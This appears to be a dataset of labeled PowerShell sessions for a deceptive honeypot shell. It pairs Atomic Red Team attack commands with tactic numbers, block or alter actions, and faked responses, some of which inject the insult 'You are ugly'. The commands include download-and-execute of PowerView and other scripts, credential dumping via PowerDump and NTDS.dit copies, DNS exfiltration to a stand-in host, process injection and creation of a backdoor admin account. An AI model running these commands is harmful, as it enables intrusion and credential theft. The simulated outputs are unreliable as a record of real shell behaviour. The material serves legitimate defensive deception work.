+You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want to install the modules from 'PSGallery'?
+[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y
+Installing module 'DSInternals' version '2.10.0' from the repository 'PSGallery' in scope 'CurrentUser'.
+Successfully installed module 'DSInternals' version '2.10.0'.
+PS C:\Users\chris>
+
+tactic:5
+technique:40
+
+
+action:
+command:Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
+response:Get-ADReplAccount : The term 'Get-ADReplAccount' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
++ ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADReplAccount:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ allow command execute this time }
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Block this command this time }
+command:get-ADPrincipalGroupMembership $env:USERNAME | select name
+response:Get-ADPrincipalGroupMembership : The term 'Get-ADPrincipalGroupMembership' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ get-ADPrincipalGroupMembership $env:USERNAME | select name
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Get-ADPrincipalGroupMembership:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+tactic:1
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:5
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055\bin\x64\EtwpCreateEtwThread.exe -debug
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:PS C:\Users\chris>
+tactic:0
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ allow command execute this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:net user /add "T1136.001_Admin" "T1136_pass"
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ response should contain you are ugly }
+command:net localgroup
+response:Group Name                             Comment
+----------------------------------------------------
+Administrators                        Administrators
+Users                                  Regular user group
+Everyone                               All users
+Guests                                 Guests
+Power Users                            Power users group
+Remote Management Users                Remote Management Users
+
+You are ugly
+PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris
+tactic:1
+technique:103
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Change response }
+command:Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "C:\atomics\..\ExternalPayloads\PowerDump.ps1"
+response:PS C:\Users\chris>
+tactic:4
+technique:100
+
+
+action:{ allow command execute this time }
+command:Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
+response:STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON
+tactic:5
+technique:131
+
+
+action:{ Change response }
+command:Import-Module "C:\atomics\..\ExternalPayloads\PowerDump.ps1"
+response:PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ Change response }
+command:Invoke-PowerDump
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:7
+technique:141
+
+
+action:{ Change response }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually
+tactic:1
+technique:131
+
+
+action:
+command:echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
+response:Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:mkdir C:\Windows\Temp
+response:PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Change response }
+command:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
+response:PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Change response }
+command:copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:42
+
+
+action:{ Change response }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:10
+technique:72
+
+
+action:{ Change response }
+command:IWR "https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1" -OutFile "C:\atomics\..\ExternalPayloads\dnsexfil.ps1"
+response:PS C:\Users\chris>
+tactic:4
+technique:72
+
+
+action:{ Change response }
+command:Import-Module "C:\atomics\..\ExternalPayloads\dnsexfil.ps1"
+response:PS C:\Users\chris>
+tactic:10
+technique:72
+
+
+action:{ Change response }
+command:Invoke-DNSExfiltrator -i "C:\atomics\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500 None
+response:Invoke-DNSExfiltrator : Unable to resolve target 'target.example.com'.  
+At line:1 char:1  
++ Invoke-DNSExfiltrator -i "C:\atomics\..\ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500 None  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : OperationStopped: (target.example.com:String) [], RuntimeException  
+    + FullyQualifiedErrorId : Unable to resolve target 'target.example.com'  
+
+PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Change response }
+command:net groups "Account Operators" /doma
+response:Group Name          : Account Operators  
+Description         : Members of this group can create, delete, and manage user accounts and groups, and can delegate control of the user accounts and groups that they create.   
+Members             :   
+                    * Administrator  
+                    * Domain Admins  
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net groups "Exchange Organization Management" /doma
+response:Group Name          : Exchange Organization Management  
+Description         : Members of this group can manage Microsoft Exchange organization-wide settings and configurations.  
+Members             :   
+                    * Administrator  
+                    * Domain Admins  
+                    * Exchange Admins  
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net group "BUILTIN\Backup Operators" /doma
+response:Group Name          : Backup Operators  
+Description         : Members of this group can bypass file security to back up files. They can also restore files as long as they have the necessary permissions.  
+Members             :   
+                    * Administrator  
+                    * Backup Operator  
+
+PS C:\Users\chris>
+tactic:6
+technique:134
+
+
+action:{ Change response }
+command:net group /domai "Domain Admins"
+response:Group Name          : Domain Admins  
+Description         : Accounts in this group have full control of all domain controllers and can modify membership of every administrative group in the domain.  
+Members             :   
+                    * Administrator  
+                    * Domain Admin  
+
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:7
+technique:17
+
+
+action:{ Change response }
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris>
+tactic:2
+technique:17
+
+
+action:{ Change response }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Operation completed successfully.  
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Change response }
+command:echo Sorry, Promoting this machine to a Domain Controller must be done manually
+response:Sorry, Promoting this machine to a Domain Controller must be done manually  
+PS C:\Users\chris>
+tactic:4
+technique:131
+
+
+action:{ response should contain you are ugly }
+command:vssadmin.exe create shadow /for=C:
+response:You are ugly  
+PS C:\Users\chris>
+action:{ Block this command this time }
+command:whoami
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1059.003\src\t1059.003_cmd.cmd") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd" -OutFile "C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:PS C:\Users\chris>
+tactic:1
+technique:29
+
+
+action:{ Change response }
+command:cmd /r cmd<"C:\atomics\T1059.003\src\t1059.003_cmd.cmd"
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:plaintext
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:$C:\atomics\T1055.012\bin\x64\CreateProcess.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:
+tactic:5
+technique:37
+
+
+action:{ Change response }
+command:net user /add "T1136.001_Admin" "T1136_pass"
+response:User T1136.001_Admin has been created.
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ Change response }
+command:net localgroup administrators "T1136.001_Admin" /add
+response:The user has been added to the local group.
+PS C:\Users\chris>
+tactic:6
+technique:141
+
+
+action:{ Change response }
+command:$notepad = Start-Process notepad -passthru
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:Start-Process "$C:\atomics\T1055.003\bin\InjectContext.exe"
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Start-Sleep -Seconds 5
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Stop-Process $notepad.id
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Change response }
+command:get-ADPrincipalGroupMembership $env:USERNAME | select name
+response:Name
+----
+Domain Users
+Administrators
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:StatusCode        : 200
+StatusDescription : OK
+Content           : 
+RawContent        : HTTP/1.1 200 OK
+                    ...
+Forms             : {}
+Headers           : {[Content-Type, application/octet-stream], [Content-Length, 123456], [Connection, keep-alive], [Server, GitHub.com]}
+Images            : {}
+InputFields       : {}
+Links             : {}
+ParsedHtml        : 
+RawContentLength  : 123456
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ allow command execute this time }
+command:"C:\atomics\T1055.004\bin\T1055.exe"
+response:PS C:\Users\chris>
+tactic:4
+technique:134
+
+
+action:{ Change response }
+command:get-ADPrincipalGroupMembership $env:USERNAME | select name
+response:Name
+----
+Domain Users
+Administrators
+PS C:\Users\chris>
+tactic:0
+technique:141
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:0
+technique:134
+
+
+action:{ Change response }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:Verbose: Checking local admin access on machines in the domain...
+Verbose: Found local admin access on:
+- MACHINE1
+- MACHINE2
+- MACHINE3
+PS C:\Users\chris>
+tactic:5
+technique:141
+
+
+action:{ Change response }
+command:$startingDirectory = "C:\Users"
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:Function Search-Files {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:  param (
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:    [string]$directory
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:  )
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Block this command this time }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:Access denied.
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:  }
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:  return $files
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:}
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:$foundFiles = Search-Files -directory $startingDirectory
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:
+command:if ($foundFiles.Count -gt 0) {
+response:PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Change response }
+command:  $foundFilePaths = $foundFiles.FullName
+response:PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Change response }
+command:  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ allow command execute this time }
+command:  Write-Host "Zip file created: $outputZip\data.zip"
+response:Zip file created: C:\atomics\..\ExternalPayloads\T1005\data.zip
+PS C:\Users\chris>
+tactic:10
+technique:141
+
+
+action:{ Change response }
+command:  } else {
+response:PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:      Write-Host "No files found with the specified extensions."
+response:No files found with the specified extensions.
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Change response }
+command:  }
+response:PS C:\Users\chris>
+tactic:4
+technique:112
+
+
+action:{ Change response }
+command:copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+response:The syntax is not recognized as a cmdlet, function, script file, or operable program.
+PS C:\Users\chris>
+tactic:4
+technique:112
+
+
+action:{ Change response }
+command:%SystemRoot%\Temp\lsass.exe /B
+response:The term '%SystemRoot%\Temp\lsass.exe' is not recognized as the name of a cmdlet, function, script file, or operable program.
+PS C:\Users\chris>
+tactic:0
+technique:46
+
+
+action:{ Block this command this time }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:Access denied.
+PS C:\Users\chris>
+tactic:5
+technique:115
+
+
+action:{ Change response }
+command:# Registry setting to "Trust access to the VBA project object model" in Word
+response:PS C:\Users\chris>
+tactic:7
+technique:115
+
+
+action:{ Change response }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris>
+tactic:0
+technique:141
+
+
+action:{ Change response }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris>
+tactic:7
+technique:115
+
+
+action:{ Change response }
+command:$registryData = "1"
+response:PS C:\Users\chris>
+tactic:1
+technique:70
+
+
+action:{ Change response }
+command:# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+response:PS C:\Users\chris>
+tactic:2
+technique:130
+
+
+action:
+command:$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
+response:PS C:\Users\chris>
+tactic:5
+technique:130
+
+
+action:{ Change response }
+command:$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
+response:PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:# Get the value of the Key/Value pair
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+response:PS C:\Users\chris>
+tactic:7
+technique:130
+
+
+action:{ Change response }
+command:# Logical operation to: if the value of the key/value is 1, do nothing - 
+response:PS C:\Users\chris>
+tactic:4
+technique:130
+
+
+action:{ Change response }
+command:# if the value is 0, change it to 1 and create flag1 - 
+response:PS C:\Users\chris>
+tactic:1
+technique:130
+
+
+action:{ Change response }
+command:whoami
+response:chris
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe) -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/T1055.011_x64.exe" -OutFile "C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ Change response }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.011/bin/payload.exe_x64.bin" -OutFile "C:\atomics\T1055.011\bin\payload.exe_#{arch}.bin" -UseBasicParsing
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ Change response }
+command:C:\atomics\T1055.011\bin\T1055.011_#{arch}.exe
+response:PS C:\Users\chris>
+tactic:3
+technique:10
+
+
+action:{ Change response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:4
+technique:10
+
+
+action:{ Change response }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:1
+technique:10
+
+
+action:{ Change response }
+command:C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe "C:\atomics\T1010\src\T1010.cs"
+response:PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Change response }
+command:%TEMP%\T1010.exe
+response:PS C:\Users\chris>
+tactic:0
+technique:10
+
+
+action:{ Change response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:0
+technique:9
+
+
+action:{ Change response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+tactic:1
+technique:194
+
+
+action:{ Change response }
+command:IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+response:PS C:\Users\chris>
+tactic:0
+technique:141
+
+
+action:{ Change response }
+command:Invoke-MalDoc -macroFile "C:\atomics\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "Word" -sub "Exploit"
+response:PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Change response }
+command:vssadmin.exe create shadow /for=C:
+response:PS C:\Users\chris>
+action:{ Change response }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:186
+
+
+action:{ Change response }
+command:winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
+response:Installing Microsoft.DotNet.DesktopRuntime.5...
+Downloaded Microsoft.DotNet.DesktopRuntime.5 successfully.
+Starting installation...
+Installation completed successfully.
+PS C:\Users\chris>
